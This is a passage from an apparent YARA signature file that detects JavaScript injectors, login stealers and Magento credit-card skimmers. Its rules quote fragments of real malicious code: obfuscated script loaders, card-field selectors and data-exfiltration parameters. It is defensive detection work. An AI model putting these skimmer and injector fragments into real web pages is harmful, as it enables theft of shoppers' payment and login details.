    condition:
        $ps0
}

rule js_malware_injector_093 : malware
{
    strings:
        $trigger = "getCookie|url|new"
    condition:
        $trigger and PR00604 and PR00862 and PR00863 and PR00864 and PR00865
}

private rule PR00866 : trigger
{
    strings:
        $ps0 = "115,99,114,105,112,116,62,); document.write("
    condition:
        $ps0
}

private rule PR00867 : trigger
{
    strings:
        $ps0 = "> var"
    condition:
        $ps0
}

rule js_malware_injector_094 : malware
{
    strings:
        $trigger = "String.fromCharCode(60,115,99,114,105,112,116,32,115,114,99,61"
    condition:
        $trigger and PR00866 and PR00867
}

// MANUAL FIX NECESSARY
private rule PR00868 : trigger
{
    strings:
        $ps0 = "dataLayer"
    condition:
        $ps0
}

private rule PR00869 : trigger
{
    strings:
        $ps0 = "].push({'gtm.start"
    condition:
        $ps0
}

private rule PR00870 : trigger
{
    strings:
        $ps0 = "GTM-"
    condition:
        $ps0
}

rule js_malware_injector_095 : malware
{
    strings:
        $trigger = "(window,document"
        $js_malware_injector_095_r0 = /GTM-(5SF293J|5PJ4D68|TRDLM7Q|5MNHBG3|PPF8WQW|5772KFL|T6TJHBR|T78G58G|K2NR34K)/
    condition:
        $trigger and PR00868 and PR00869 and PR00870 and $js_malware_injector_095_r0
}

// MANUAL FIX NECESSARY
private rule PR00871 : trigger
{
    strings:
        $ps0 = "document.createElement('script')"
    condition:
        $ps0
}

private rule PR00872 : trigger
{
    strings:
        $ps0 = "location.protocol+"
    condition:
        $ps0
}

rule js_malware_injector_098 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
        $js_malware_injector_098_r0 = /document.createElement\(.script.\)[\s]*[\w]+\.src[\s]*=[\s]*location\.protocol\+...[\w]+.[\w]+\.[\w]+\/[\w]+\.[\w]+/
    condition:
        $trigger and PR00871 and PR00872 and $js_malware_injector_098_r0
}

rule js_malware_injector_099 : malware
{
    strings:
        $trigger = "\\x69\\x6E\\x73\\x65\\x72\\x74\\x42\\x65\\x66\\x6F\\x72\\x65\",\"\\x70\\x61\\x72\\x65\\x6E\\x74\\x4E\\x6F\\x64\\x65"
        $js_malware_injector_099_w0 = "_pop=_pop"
    condition:
        $trigger and PR00332 and not $js_malware_injector_099_w0
}

rule js_malware_injector_stats_001 : malware
{
    strings:
        $trigger = "String.fromCharCode(104, 116, 116, 112,"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule js_malware_injector_stats_001_02 : malware
{
    strings:
        $trigger = "String.fromCharCode(104, 116, 116, 112,"
        $js_malware_injector_stats_001_02_r0 = /var _0x[\w]+[\s]*=[\s]*function\(_0x[\w]+,[\s]*_0x[\w]+\)[\s]*\{[\s]*var [\w]+[\s]*=[\s]*document\.createElement\(.script.\)/
    condition:
        $trigger and $js_malware_injector_stats_001_02_r0
}

private rule PR00873 : trigger
{
    strings:
        $ps0 = "var need_t = true;"
    condition:
        $ps0
}

rule js_malware_injector_stats_002 : malware
{
    strings:
        $trigger = "String.fromCharCode(104, 116, 116, 112,"
    condition:
        $trigger and PR00873
}

private rule PR00874 : trigger
{
    strings:
        $ps0 = "String.fromCharCode(115, 99, 114, 105, 112, 116))"
    condition:
        $ps0
}

rule js_malware_injector_stats_003 : malware
{
    strings:
        $trigger = "String.fromCharCode(104, 116, 116, 112,"
    condition:
        $trigger and PR00874
}

private rule PR00875 : trigger
{
    strings:
        $ps0 = "83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 49, 48, 52, 44, 32, 49, 49, 54, 44, 32, 49, 49, 54, 44, 32, 49, 49, 50, 44, 32, 49, 49, 53, 44, 32, 53, 56, 44, 32, 52, 55, 44,"
    condition:
        $ps0
}

rule js_malware_injector_stats_004 : malware
{
    strings:
        $trigger = "eval(String.fromCharCode(118, 97, 114, 32,"
    condition:
        $trigger and PR00875
}

private rule PR00876 : trigger
{
    strings:
        $ps0 = "83, 116, 114, 105, 110, 103, 91, 34, 92, 120, 54, 54, 92, 120, 55, 50, 92, 120, 54, 70, 92, 120, 54, 68, 92, 120, 52, 51, 92, 120, 54, 56, 92, 120, 54, 49, 92, 120, 55, 50, 92, 120, 52, 51, 92, 120, 54, 70, 92, 120, 54, 52, 92, 120, 54, 53"
    condition:
        $ps0
}

rule js_malware_injector_stats_004_02 : malware
{
    strings:
        $trigger = "eval(String.fromCharCode(118, 97, 114, 32,"
    condition:
        $trigger and PR00876
}

private rule PR00877 : trigger
{
    strings:
        $ps0 = "100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 34, 104, 101, 97, 100, 34, 41, 91, 48, 93, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40"
    condition:
        $ps0
}

rule js_malware_injector_stats_004_03 : malware
{
    strings:
        $trigger = "eval(String.fromCharCode(118, 97, 114, 32,"
    condition:
        $trigger and PR00877
}

// MANUAL FIX NECESSARY
rule js_malware_injector_stats_004_04 : malware
{
    strings:
        $trigger = "eval(String.fromCharCode(118, 97, 114, 32,"
        $js_malware_injector_stats_004_04_r0 = /var [\w]+[\s]*=[\s]*[\d]+;[\s]*eval\(String\.fromCharCode\(118/
    condition:
        $trigger and $js_malware_injector_stats_004_04_r0
}

private rule PR00878 : trigger
{
    strings:
        $ps0 = "(function(){ var"
    condition:
        $ps0
}

private rule PR00879 : trigger
{
    strings:
        $ps0 = "document.getElementsByTagName(\"script\")[0];"
    condition:
        $ps0
}

private rule PR00880 : trigger
{
    strings:
        $ps0 = "String.fromCharCode(104, 116, 116, 112,"
    condition:
        $ps0
}

rule js_malware_injector_stats_005 : malware
{
    strings:
        $trigger = ".parentNode.insertBefore("
    condition:
        $trigger and PR00878 and PR00879 and PR00880
}

// MANUAL FIX NECESSARY
rule js_malware_injector_stats_006 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
        $js_malware_injector_stats_006_r0 = /(var [\w]+[\s]*=[\s]*String\.fromCharCode\([^\)]+\);[\s]*){4,}var [\w]+[\s]*=[\s]*document\.createElement\([\w]+\);[\s]*[\w]\.type[^;]+;[\s]*var[\s]*[\w]+[\s]*=[\s]*document\.getElementsByTagName\([^;]+\];[\s]*[\w]+\.parentNode\.insertBefore\([\w],[\s]*[\w]\);/
    condition:
        $trigger and $js_malware_injector_stats_006_r0
}

rule js_malware_js_jquery_min_php_001 : malware
{
    strings:
        $trigger = "/js/jquery.min.php\"; var n_url"
    condition:
        $trigger and PR00641
}

private rule PR00881 : trigger
{
    strings:
        $ps0 = "loadPNGData(strFile,"
    condition:
        $ps0
}

private rule PR00882 : trigger
{
    strings:
        $ps0 = "data.png"
    condition:
        $ps0
}

rule js_malware_loadPNGData_001 : malware
{
    strings:
        $trigger = "fromCharCode"
    condition:
        $trigger and PR00029 and PR00881 and PR00882
}

private rule PR00883 : trigger
{
    strings:
        $ps0 = "RegExp"
    condition:
        $ps0
}

rule js_malware_login_stealer_001 : malware
{
    strings:
        $trigger = "\"\\x45\\x6c\\x65\\x6d\\x65\\x6e\\x74\",\"\\x66\\x75\\x6e\\x63"
    condition:
        $trigger and PR00423 and PR00883
}

private rule PR00884 : trigger
{
    strings:
        $ps0 = "btoa(location.host +"
    condition:
        $ps0
}

rule js_malware_login_stealer_002 : malware
{
    strings:
        $trigger = ".preventDefault(); return false; } }); clearInterval("
    condition:
        $trigger and PR00423 and PR00883 and PR00884
}

private rule PR00885 : trigger
{
    strings:
        $ps0 = "if(i.location['href'].indexOf"
    condition:
        $ps0
}

rule js_malware_login_stealer_003 : malware
{
    strings:
        $trigger = "(i.atob("
    condition:
        $trigger and PR00885
}

private rule PR00886 : trigger
{
    strings:
        $ps0 = "=document['querySelector']('#user_login')[_0x"
    condition:
        $ps0
}

rule js_malware_login_stealer_004 : malware
{
    strings:
        $trigger = ")]+'&ip=127.0.0.1&url='+encodeURIComponent(window[_0x"
    condition:
        $trigger and PR00886 and PR00639 and PR00638
}

private rule PR00887 : trigger
{
    strings:
        $ps0 = "this['eval']("
    condition:
        $ps0
}

rule js_malware_magentoccstealer_002_03 : malware
{
    strings:
        $trigger = "20snd"
    condition:
        $trigger and PR00887
}

rule js_malware_magentoccstealer_002_04 : malware
{
    strings:
        $trigger = "if\\x28\\x28n\\x65\\x77\\x20R\\x65gExp"
    condition:
        $trigger and PR00887
}

private rule PR00888 : trigger
{
    strings:
        $ps0 = "\\x71\\x75\\x65\\x72\\x79\\x53\\x65\\x6C\\x65\\x63\\x74\\x6F\\x72\\x41\\x6C\\x6C"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_005 : malware
{
    strings:
        $trigger = "new RegExp"
        $js_malware_magentoccstealer_005_w0 = "\\x42\\x4C\\x4F\\x47\\x20\\x53\\x54\\x41\\x52\\x54\\x53\\x20\\x48\\x45\\x52\\x45"
    condition:
        $trigger and PR00323 and PR00888 and not $js_malware_magentoccstealer_005_w0
}

private rule PR00889 : trigger
{
    strings:
        $ps0 = "xmlhttp.open(\"GET\","
    condition:
        $ps0
}

rule js_malware_magentoccstealer_006 : malware
{
    strings:
        $trigger = "=\"name=\"+name+\"&num=\"+num+\"&mon=\"+mon+\"&yr=\"+yr+\"&cid=\"+CVN;"
    condition:
        $trigger and PR00653 and PR00889
}

rule js_malware_magentoccstealer_006_02 : malware
{
    strings:
        $trigger = "_stripe_cc_number\").value;"
    condition:
        $trigger and PR00653 and PR00889
}

rule js_malware_magentoccstealer_007 : malware
{
    strings:
        $trigger = "getElementById(\"billing:customer_password\").value;"
    condition:
        $trigger and PR00653 and PR00889
}

private rule PR00890 : trigger
{
    strings:
        $ps0 = "http.send(\"data=\"+"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_008 : malware
{
    strings:
        $trigger = "function clk()"
    condition:
        $trigger and PR00423 and PR00883 and PR00890
}

private rule PR00891 : trigger
{
    strings:
        $ps0 = "// Credit Card Validation Javascript"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_009 : malware
{
    strings:
        $trigger = "frm[i].attachEvent('onsubmit', fixform);"
    condition:
        $trigger and PR00423 and PR00883 and PR00891
}

private rule PR00892 : trigger
{
    strings:
        $ps0 = ".test(window.location))"
    condition:
        $ps0
}

private rule PR00893 : trigger
{
    strings:
        $ps0 = "{document.write('>tpircs/<>"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_010 : malware
{
    strings:
        $trigger = "new RegExp"
    condition:
        $trigger and PR00892 and PR00893
}

private rule PR00894 : trigger
{
    strings:
        $ps0 = "{document.write('<script src=\""
    condition:
        $ps0
}

rule js_malware_magentoccstealer_010_02 : malware
{
    strings:
        $trigger = "new RegExp"
    condition:
        $trigger and PR00892 and PR00894
}

rule js_malware_magentoccstealer_011 : malware
{
    strings:
        $trigger = "\\x6D\\x65\\x64\\x4D\\x65\\x7C\\x70\\x61\\x79\\x6D\\x65\\x6E\\x74\\x7C\\x5F\\x63\\x63\\x5F\\x6E\\x75\\x6D\\x62\\x65\\x72\\x7C"
    condition:
        $trigger and PR00332
}

private rule PR00895 : trigger
{
    strings:
        $ps0 = "var jsvalidator={"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_012 : malware
{
    strings:
        $trigger = "'gi')).test(window.location)){ jsvalidator.validate(); }"
    condition:
        $trigger and PR00423 and PR00883 and PR00895
}

private rule PR00896 : trigger
{
    strings:
        $ps0 = "\\x64\\x6F\\x63\\x75\\x6D\\x65\\x6E\\x74"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_013 : malware
{
    strings:
        $trigger = "\"\\x5C\\x77\\x2B\",\"\\x5C\\x62\",\"\\x67\"];eval(function("
        $js_malware_magentoccstealer_013_w0 = "$('.MenuTrigger');"
    condition:
        $trigger and PR00896 and not $js_malware_magentoccstealer_013_w0
}

rule js_malware_magentoccstealer_014 : malware
{
    strings:
        $trigger = "\\x63\\x63\\x73\\x61\\x76\\x65\\x5F\\x65\\x78\\x70\\x69\\x72\\x61\\x74\\x69\\x6F\\x6E\\x5F\\x79\\x72"
    condition:
        $trigger and PR00638 and PR00639
}

private rule PR00897 : trigger
{
    strings:
        $ps0 = "onepage|checkout|onestep"
    condition:
        $ps0
}

private rule PR00898 : trigger
{
    strings:
        $ps0 = "Glink:'http"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_015 : malware
{
    strings:
        $trigger = "new RegExp"
    condition:
        $trigger and PR00897 and PR00323 and PR00898
}

private rule PR00899 : trigger
{
    strings:
        $ps0 = "99,104,101,99,107,111,117,116"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_015_02 : malware
{
    strings:
        $trigger = "116,101,115,116,40,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110"
    condition:
        $trigger and PR00029 and PR00899
}

private rule PR00900 : trigger
{
    strings:
        $ps0 = "['atob']=function(_0x"
    condition:
        $ps0
}

private rule PR00901 : trigger
{
    strings:
        $ps0 = "grelos_v={'snd':null,"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_015_03 : malware
{
    strings:
        $trigger = "['atob']||(_0x"
    condition:
        $trigger and PR00639 and PR00900 and PR00901 and PR00638
}

rule js_malware_magentoccstealer_016 : malware
{
    strings:
        $trigger = "\"\\x47\\x45\\x54\",\"\\x68\\x74\\x74\\x70\\x73\\x3A\\x2F\\x2F\\x73\\x63\\x72\\x69\\x70\\x74\\x62\\x2E\\x63\\x6F\\x6D\\x2F"
    condition:
        $trigger
}

private rule PR00902 : trigger
{
    strings:
        $ps0 = "nepage|checkou"
    condition:
        $ps0
}

private rule PR00903 : trigger
{
    strings:
        $ps0 = "].concat(o);var"
    condition:
        $ps0
}

private rule PR00904 : trigger
{
    strings:
        $ps0 = "eval((function(){var"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_017 : malware
{
    strings:
        $trigger = "fromCharCode"
    condition:
        $trigger and PR00902 and PR00903 and PR00904
}

rule js_malware_magentoccstealer_018 : malware
{
    strings:
        $trigger = "static-4677.kxcdn.com"
    condition:
        $trigger and PR00050
}

private rule PR00905 : trigger
{
    strings:
        $ps0 = "form:has([name^=payment])"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_019 : malware
{
    strings:
        $trigger = "document.getElementsByName('payment[cc_number]"
    condition:
        $trigger and PR00905
}

rule js_malware_magentoccstealer_019_02 : malware
{
    strings:
        $trigger = "crossDomain:false,data:data,type:'POST',dataType:'json'})}}}},700);"
    condition:
        $trigger and PR00653
}

rule js_malware_magentoccstealer_019_03 : malware
{
    strings:
        $trigger = "crossDomain:false,data:data,type:'POST',dataType:'json'})}break}}},700);"
    condition:
        $trigger and PR00653
}

// MANUAL FIX NECESSARY
rule js_malware_magentoccstealer_020 : malware
{
    strings:
        $trigger = "RegExp"
        $js_malware_magentoccstealer_020_r0 = /if\(\(new\s*RegExp\('(\w+creditcard|onepage)?\|checkout\|\w+/
        $js_malware_magentoccstealer_020_r1 = /http.send\(.info=.\+keym\+'&hostname='\+\w+\+.&key=.\+/
    condition:
        $trigger and PR00423 and $js_malware_magentoccstealer_020_r0 and $js_malware_magentoccstealer_020_r1
}

private rule PR00906 : trigger
{
    strings:
        $ps0 = "// Credit Card Validation Javascri"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_021 : malware
{
    strings:
        $trigger = "+encodeURIComponent(b)+\"&domain=\"+dmn);"
    condition:
        $trigger and PR00653 and PR00906
}

private rule PR00907 : trigger
{
    strings:
        $ps0 = "street2|city|paypal_direct_cc_number"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_022 : malware
{
    strings:
        $trigger = "|authorizenet_expiration_yr|authorizenet_expiration|firstname|"
    condition:
        $trigger and PR00907 and PR00604
}

private rule PR00908 : trigger
{
    strings:
        $ps0 = "var address"
    condition:
        $ps0
}

private rule PR00909 : trigger
{
    strings:
        $ps0 = "function send_data() {"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_023 : malware
{
    strings:
        $trigger = "new RegExp"
    condition:
        $trigger and PR00908 and PR00897 and PR00323 and PR00909
}

private rule PR00910 : trigger
{
    strings:
        $ps0 = "\\x6F\\x6E\\x65\\x70\\x61\\x67\\x65\\x7C\\x63\\x68\\x65\\x63\\x6B\\x6F\\x75\\x74"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_024 : malware
{
    strings:
        $trigger = "<script>"
    condition:
        $trigger and PR00910
}

private rule PR00911 : trigger
{
    strings:
        $ps0 = "\\x73\\x65\\x6C\\x65\\x63\\x74\\x5B\\x6E\\x61\\x6D\\x65\\x3D\\x22\\x70\\x61\\x79\\x6D\\x65\\x6E\\x74\\x5B\\x63\\x63\\x5F\\x65\\x78\\x70\\x5F\\x79\\x65\\x61\\x72\\x5D\\x22\\x5D"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_025 : malware
{
    strings:
        $trigger = "document["
    condition:
        $trigger and PR00911
}

rule js_malware_magentoccstealer_027 : malware
{
    strings:
        $trigger = "this['atob']"
    condition:
        $trigger and PR00887
}

rule js_malware_magentoccstealer_028 : malware
{
    strings:
        $trigger = "\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x69\\x70\\x2e\\x35\\x75\\x75\\x38\\x2e\\x63\\x6f\\x6d\\x2f\\x69\\x70\\x2f\\x69\\x70\\x5f"
    condition:
        $trigger and PR00050
}

rule js_malware_magentoccstealer_029 : malware
{
    strings:
        $trigger = "window.location.href,q.match(/onepage|checkout/gi)"
    condition:
        $trigger and PR00050
}

private rule PR00912 : trigger
{
    strings:
        $ps0 = "$validateIds = $('#co-payment-form, #opc-address-form-billing"
    condition:
        $ps0
}

private rule PR00913 : trigger
{
    strings:
        $ps0 = "$(this).find( \"input, textarea, select"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_030 : malware
{
    strings:
        $trigger = "define"
    condition:
        $trigger and PR00912 and PR00913
}

private rule PR00914 : trigger
{
    strings:
        $ps0 = "fromCharCode(K);H=String(A)"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_031 : malware
{
    strings:
        $trigger = "this[\"eval\"]("
    condition:
        $trigger and PR00914
}

private rule PR00915 : trigger
{
    strings:
        $ps0 = "= $.noConflict(true);</scr"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_032 : malware
{
    strings:
        $trigger = "new RegExp"
    condition:
        $trigger and PR00897 and PR00323 and PR00915
}

private rule PR00916 : trigger
{
    strings:
        $ps0 = "paypal_direct_cc_cid|ct|zp|fln|ad|authorizenet_cc_cid"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_033 : malware
{
    strings:
        $trigger = "eval(function(p,a,c,k,e,"
    condition:
        $trigger and PR00916 and PR00677
}

private rule PR00917 : trigger
{
    strings:
        $ps0 = "uname"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_033_02 : malware
{
    strings:
        $trigger = "QWpheC5SZXNwb25kZXJzLnJlZ2lzdGVyKFZhcmllbi5HbG9iYWxIYW5kbGVycyk7"
    condition:
        $trigger and PR00435 and PR00917
}

private rule PR00918 : trigger
{
    strings:
        $ps0 = "jQuery(\"input[name='payment[cc_cid]"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_034 : malware
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR00371 and PR00918
}

private rule PR00919 : trigger
{
    strings:
        $ps0 = "input[name='payment[cc_cid]"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_035 : malware
{
    strings:
        $trigger = "{localStorage.setItem(\"billing\",jQuery(\"#co-billing-form"
    condition:
        $trigger and PR00919 and PR00323
}

private rule PR00920 : trigger
{
    strings:
        $ps0 = "(.*?(cc_number|ccnumber|cardno|card|cardNumber"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_036 : malware
{
    strings:
        $trigger = "\\x"
    condition:
        $trigger and PR00920 and PR00647
}

rule js_malware_magentoccstealer_037 : malware
{
    strings:
        $trigger = ";var r=t.length;var f=[];for(var j=0;j<r;j++){f[j]=t.charAt(j)};for(var j=0;j<r;j++){var b=o*(j+"
    condition:
        $trigger
}

private rule PR00921 : trigger
{
    strings:
        $ps0 = "query_verifto += \"&cc_year=\" + encodeURIComponent"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_038 : malware
{
    strings:
        $trigger = "Mage"
    condition:
        $trigger and PR00921
}

// MANUAL FIX NECESSARY
rule js_malware_magentoccstealer_039 : malware
{
    strings:
        $trigger = "eva"
        $js_malware_magentoccstealer_039_r0 = /this\s*\[\s*[\"']eval[\"']\s*\]\s*\(\s*this\s*\[\s*[\"']unescape[\"']\s*\]\s*\(\s*[\"'](i|%69)(f|%66)(\(|%28)(\(|%28)(n|%6e|%6E)(e|%65)(w|%77)( |%20)(R|%52)(e|%65)(g|%67)(E|%45)(x|%78)(p|%70)/
    condition:
        $trigger and $js_malware_magentoccstealer_039_r0
}

private rule PR00922 : trigger
{
    strings:
        $ps0 = "'\\x64\\x61\\x74\\x61':{'\\x66\\x72\\x6f\\x6e\\x74\\x65\\x6e\\x64':encData},'\\x73\\x75\\x63\\x63\\x65\\x73\\x73"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_040 : malware
{
    strings:
        $trigger = "fromCharCode"
    condition:
        $trigger and PR00922 and PR00029
}

private rule PR00923 : trigger
{
    strings:
        $ps0 = "ebe7e10fc04a7d26ab181b0ebf675d26"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_041 : malware
{
    strings:
        $trigger = "fromCharCode"
    condition:
        $trigger and PR00923 and PR00029
}

private rule PR00924 : trigger
{
    strings:
        $ps0 = "eval(function(w,i,s,e){"
    condition:
        $ps0
}

private rule PR00925 : trigger
{
    strings:
        $ps0 = "Mage"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_041_02 : malware
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR00924 and PR00925
}

// MANUAL FIX NECESSARY
private rule PR00926 : trigger
{
    strings:
        $ps0 = "').substr(0,"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_042 : malware
{
    strings:
        $trigger = "(function(){var"
        $js_malware_magentoccstealer_042_r0 = /\(function\(\)\{var [\w]+=..,[\w]+=([\d]+|-)*;function [\w]+\([\w]+\)\{var [\w]+=[\d]+;var [\w]+=[\w]+\.length;var [\w]+=\[\];for\(var/
    condition:
        $trigger and PR00926 and $js_malware_magentoccstealer_042_r0
}

private rule PR00927 : trigger
{
    strings:
        $ps0 = "+btoa(n),document.body.appendChild(a)}window.onload=function(){"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_043 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR00927
}

rule js_malware_magentoccstealer_044 : malware
{
    strings:
        $trigger = "replace|_cc_number|else|lastname|firstname|_expiration_yr"
    condition:
        $trigger and PR00677 and PR00604
}

private rule PR00928 : trigger
{
    strings:
        $ps0 = "=[\"\\x63\\x6F\\x6F\\x6B\\x69\\x65\",\""
    condition:
        $ps0
}

rule js_malware_magentoccstealer_045 : malware
{
    strings:
        $trigger = ";document[_"
    condition:
        $trigger and PR00928
}

// MANUAL FIX NECESSARY
private rule PR00929 : trigger
{
    strings:
        $ps0 = "window[\""
    condition:
        $ps0
}

rule js_malware_magentoccstealer_046 : malware
{
    strings:
        $trigger = "](\"div\");"
        $js_malware_magentoccstealer_046_r0 = /\(function [\w]+\(\)\{[^=]+[\w]+[\s]*=[\s]*\"[^;]+;+[\s]*var [\w]+[\s]*=[\s]*\"[^;]+\";+[\s]*var [\w]+[\s]*=[\s]*document\[\"cre[^;]+div\"\);+[^\{]+=[\s]*\{\};+[\s]*([\w]+[=\[\( ][^\n]+;+[\s]*)+\}\)\(\);[\s]*/
    condition:
        $trigger and PR00929 and PR00647 and PR00634 and $js_malware_magentoccstealer_046_r0
}

private rule PR00930 : trigger
{
    strings:
        $ps0 = "\")+\"?image_id=\"+"
    condition:
        $ps0
}

private rule PR00931 : trigger
{
    strings:
        $ps0 = "document.createElement(\"img\");a.width=\"1px\",a.height=\"1px\",a.id=t,a.src=atob(\""
    condition:
        $ps0
}

rule js_malware_magentoccstealer_047 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR00930 and PR00931
}

private rule PR00932 : trigger
{
    strings:
        $ps0 = "){return btoa(encodeURIComponent(e).replace(/%([0-9A-F]{2})/g,function(e,"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_047_02 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR00930 and PR00932
}

private rule PR00933 : trigger
{
    strings:
        $ps0 = "eval(function("
    condition:
        $ps0
}

rule js_malware_magentoccstealer_048 : malware
{
    strings:
        $trigger = ".push(String.fromCharCode(parseInt("
    condition:
        $trigger and PR00933
}

private rule PR00934 : trigger
{
    strings:
        $ps0 = "&loc="
    condition:
        $ps0
}

private rule PR00935 : trigger
{
    strings:
        $ps0 = "img.src = window.atob("
    condition:
        $ps0
}

private rule PR00936 : trigger
{
    strings:
        $ps0 = "+ window.btoa(location.href);"
    condition:
        $ps0
}

private rule PR00937 : trigger
{
    strings:
        $ps0 = "&data="
    condition:
        $ps0
}

rule js_malware_magentoccstealer_049 : malware
{
    strings:
        $trigger = "document"
    condition:
        $trigger and PR00934 and PR00935 and PR00936 and PR00937
}

private rule PR00938 : trigger
{
    strings:
        $ps0 = "setInterval(function(){if(!window.$sloaded&&!window.devtools.open&&\"undefined"
    condition:
        $ps0
}

private rule PR00939 : trigger
{
    strings:
        $ps0 = "atob(\"c2NyaXB0\"));e.src=atob(\"aHR0cH"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_049_02 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR00938 and PR00939
}

private rule PR00940 : trigger
{
    strings:
        $ps0 = "ustomEvent(\"devtoolschange\""
    condition:
        $ps0
}

private rule PR00941 : trigger
{
    strings:
        $ps0 = "/checkout/.test"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_049_03 : malware
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR00940 and PR00941 and PR00925
}

private rule PR00942 : trigger
{
    strings:
        $ps0 = "=i().fromCharCode(127)"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_050 : malware
{
    strings:
        $trigger = "charAt"
    condition:
        $trigger and PR00942
}

private rule PR00943 : trigger
{
    strings:
        $ps0 = "id'],'cookie':AnalyticsId["
    condition:
        $ps0
}

rule js_malware_magentoccstealer_050_02 : malware
{
    strings:
        $trigger = "['atob']||(_0x"
    condition:
        $trigger and PR00639 and PR00900 and PR00638 and PR00943
}

private rule PR00944 : trigger
{
    strings:
        $ps0 = "var JSON=JSON||{};JSON.stringify=JSON"
    condition:
        $ps0
}

private rule PR00945 : trigger
{
    strings:
        $ps0 = "var hex_chr"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_051 : malware
{
    strings:
        $trigger = "GetCCInfo"
    condition:
        $trigger and PR00944 and PR00945 and PR00725
}

private rule PR00946 : trigger
{
    strings:
        $ps0 = "JSON.parse($s.Base64.decode(Cookies.get(\"$sent\")));"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_051_02 : malware
{
    strings:
        $trigger = "GetCCInfo"
    condition:
        $trigger and PR00945 and PR00725 and PR00946
}

private rule PR00947 : trigger
{
    strings:
        $ps0 = ",'GetCCInfo',"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_051_03 : malware
{
    strings:
        $trigger = "String"
    condition:
        $trigger and PR00945 and PR00947
}

// MANUAL FIX NECESSARY
rule js_malware_magentoccstealer_051_04 : malware
{
    strings:
        $trigger = "GetCCInfo"
        $js_malware_magentoccstealer_051_04_r0 = /var _0x[\w]+=\[[^\]]{2000,}\];[\s]*\(function[^\n]+\}\}/
    condition:
        $trigger and PR00725 and $js_malware_magentoccstealer_051_04_r0
}

private rule PR00948 : trigger
{
    strings:
        $ps0 = "['SendData']();},'LoadImage':function(_0x"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_051_05 : malware
{
    strings:
        $trigger = "String"
    condition:
        $trigger and PR00948
}

private rule PR00949 : trigger
{
    strings:
        $ps0 = "/gate.php?token="
    condition:
        $ps0
}

private rule PR00950 : trigger
{
    strings:
        $ps0 = "(jQuery('input[name=\"payment[cc_number]\"]').val().replace(/[^0-9]/g,"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_052 : malware
{
    strings:
        $trigger = "jQuery('#onestepcheckout-form').change(function()"
    condition:
        $trigger and PR00949 and PR00323 and PR00950
}

private rule PR00951 : trigger
{
    strings:
        $ps0 = "{return t.replace(/[0-9A-Z]/g,\"\")}\"undefined\"!=typeof exports"
    condition:
        $ps0
}

private rule PR00952 : trigger
{
    strings:
        $ps0 = "charAt"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_054 : malware
{
    strings:
        $trigger = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
    condition:
        $trigger and PR00951 and PR00952
}

private rule PR00953 : trigger
{
    strings:
        $ps0 = "importCdn.setAttribute('src',"
    condition:
        $ps0
}

private rule PR00954 : trigger
{
    strings:
        $ps0 = "document.head.appendChild"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_055 : malware
{
    strings:
        $trigger = "document.createElement('script');"
    condition:
        $trigger and PR00953 and PR00954
}

private rule PR00955 : trigger
{
    strings:
        $ps0 = "window|open|orientation|function|var|null|Firebug|module|sloaded|atob"
    condition:
        $ps0
}

rule js_malware_magentoccstealer_056 : malware
{
    strings:
        $trigger = "eval(function(p,a,c,k,e,"
    condition:
        $trigger and PR00677 and PR00955
}

private rule PR00956 : trigger
{
    strings:
        $ps0 = "location.href.search(atob("
    condition:
        $ps0
}

rule js_malware_magentoccstealer_057 : malware
{
    strings:
        $trigger = "document.head.appendChild"
    condition:
